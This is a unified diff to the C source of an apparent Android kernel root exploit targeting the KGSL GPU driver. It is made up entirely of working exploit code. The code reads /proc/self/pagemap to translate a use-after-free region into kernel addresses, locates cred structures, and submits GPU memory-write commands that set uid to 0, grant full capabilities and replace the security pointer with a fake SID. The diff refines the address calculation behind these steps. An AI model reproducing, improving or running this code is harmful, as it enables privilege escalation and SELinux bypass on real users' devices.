@@ -459,23 +459,36 @@ int main(int argc, char **argv) {
     uint64_t dst_ga = 0, dst_flags = 0;
     gpuobj_info(kgsl_fd, dst_id, &dst_ga, &dst_flags);
 
+    int pagemap_fd = open("/proc/self/pagemap", O_RDONLY);
+    if (pagemap_fd < 0) die("open pagemap");
+
+    uint64_t pagemap_entry;
+    off_t off = (OVERLAP_ADDR / 0x1000) * 8;
+    if (lseek(pagemap_fd, off, SEEK_SET) != off || read(pagemap_fd, &pagemap_entry, sizeof(pagemap_entry)) != sizeof(pagemap_entry)) {
+        die("read pagemap for overlap");
+    }
+    if (!(pagemap_entry & 0x8000000000000000ULL)) {
+        printf("[-] OVERLAP_ADDR not present in pagemap\n");
+        return 1;
+    }
+    uint64_t pfn = pagemap_entry & 0x7FFFFFFFFFFFFFULL;
+    uint64_t pa_overlap = pfn << 12;
+    uint64_t uaf_base_pa = pa_overlap - (OVERLAP_ADDR - UAF_ADDR);
+    uint32_t phys_offset = (uint32_t)(kernel_base & 0xFFFFFFFFULL);
+    printf("[*] UAF base physical address = 0x%lx\n", (unsigned long)uaf_base_pa);
+    printf("[*] phys_offset = 0x%x\n", phys_offset);
+
     uint64_t scan_start = UAF_ADDR + 0x1000;
     uint64_t end_va = UAF_ADDR + UAF_SIZE - 0x1000;
     uint64_t cred_pages[32];
     int cred_offs[32];
-    uint64_t kernel_sec_vas[32];
+    uint64_t fake_sec_addrs[32];
     int n_cred = 0;
     int sec_offset = -1;
 
     uint32_t *cmd;
     int dw;
     unsigned int ts;
-
-    int pagemap_fd = open("/proc/self/pagemap", O_RDONLY);
-    if (pagemap_fd < 0) {
-        printf("[-] Failed to open /proc/self/pagemap, aborting\n");
-        return 1;
-    }
 
     for (uint64_t va = scan_start; va < end_va && n_cred < 1; va += 0x1000) {
         if (((va - scan_start) & 0xFFFFF) == 0) printf(".");
@@ -511,6 +524,11 @@ int main(int argc, char **argv) {
             printf("\n  [CRED] va=0x%lx off=0x%x\n", (unsigned long)va, cred_off_found);
             cred_pages[n_cred] = va;
             cred_offs[n_cred] = cred_off_found;
+
+            uint64_t pa_cred = uaf_base_pa + (va - UAF_ADDR);
+            uint64_t kva_cred = kernel_base + (pa_cred - phys_offset);
+            fake_sec_addrs[n_cred] = kva_cred + 0xFB0;
+            printf("  fake_sec_addr = 0x%lx\n", (unsigned long)fake_sec_addrs[n_cred]);
             n_cred++;
 
             if (sec_offset == -1) {
@@ -528,26 +546,6 @@ int main(int argc, char **argv) {
                     printf("  found security pointer offset 0x%x\n", sec_offset);
                 }
             }
-
-            // Get PFN from pagemap
-            uint64_t pagemap_entry;
-            off_t off = (va / 0x1000) * 8;
-            if (lseek(pagemap_fd, off, SEEK_SET) == off &&
-                read(pagemap_fd, &pagemap_entry, sizeof(pagemap_entry)) == sizeof(pagemap_entry)) {
-                if (pagemap_entry & 0x8000000000000000ULL) {
-                    uint64_t pfn = pagemap_entry & 0x7FFFFFFFFFFFFFULL;
-                    uint64_t kernel_linear_base = 0xffffffc000000000ULL; // PAGE_OFFSET for 39-bit VA
-                    uint64_t kernel_va = kernel_linear_base + (pfn << 12);
-                    kernel_sec_vas[n_cred] = kernel_va + 0xFB0; // use offset within page
-                    printf("  kernel_sec_va = 0x%lx\n", (unsigned long)kernel_sec_vas[n_cred]);
-                } else {
-                    printf("  page not present? pagemap=0x%lx\n", pagemap_entry);
-                    kernel_sec_vas[n_cred] = 0;
-                }
-            } else {
-                printf("  failed to read pagemap\n");
-                kernel_sec_vas[n_cred] = 0;
-            }
         }
     }
     close(pagemap_fd);
@@ -560,12 +558,6 @@ int main(int argc, char **argv) {
 
     printf("[*] Phase 8: Overwrite cred fields (uid=0, caps=full, security=kernel SID)\n");
     for (int p = 0; p < n_cred && p < 32; p++) {
-        // Write fake sid (1) into the page at the chosen offset
-        if (kernel_sec_vas[p] != 0) {
-            uint32_t *page = (uint32_t *)(uintptr_t)cred_pages[p];
-            page[0xFB0 / 4] = 1;
-        }
-
         uint64_t cbase = cred_pages[p] + cred_offs[p];
         cmd = (uint32_t *)ib_m;
         dw = 0;
@@ -590,13 +582,13 @@ int main(int argc, char **argv) {
             cmd[dw++] = 0xFFFFFFFF; cmd[dw++] = 0xFFFFFFFF;
         }
 
-        if (sec_offset >= 0 && kernel_sec_vas[p] != 0) {
+        if (sec_offset >= 0 && fake_sec_addrs[p] != 0) {
             uint64_t sec_addr_base = cbase + sec_offset;
             uint32_t al, ah;
             split64(sec_addr_base, &al, &ah);
             cmd[dw++] = cp_type7(CP_MEM_WRITE, 5);
             cmd[dw++] = al; cmd[dw++] = ah;
-            split64(kernel_sec_vas[p], &al, &ah);
+            split64(fake_sec_addrs[p], &al, &ah);
             cmd[dw++] = al; cmd[dw++] = ah;
         }
 
@@ -604,6 +596,12 @@ int main(int argc, char **argv) {
         __sync_synchronize();
         if (submit_ib(kgsl_fd, ctx_id, ib_ga, dw*4, ib_id, &ts) == 0)
             wait_timestamp(kgsl_fd, ctx_id, ts);
+    }
+
+    // Write fake SID=1 into the pages
+    for (int p = 0; p < n_cred; p++) {
+        uint32_t *page = (uint32_t *)(uintptr_t)cred_pages[p];
+        page[0xFB0 / 4] = 1;
     }
 
     flush_dc_civac_range((void*)UAF_ADDR, UAF_SIZE);
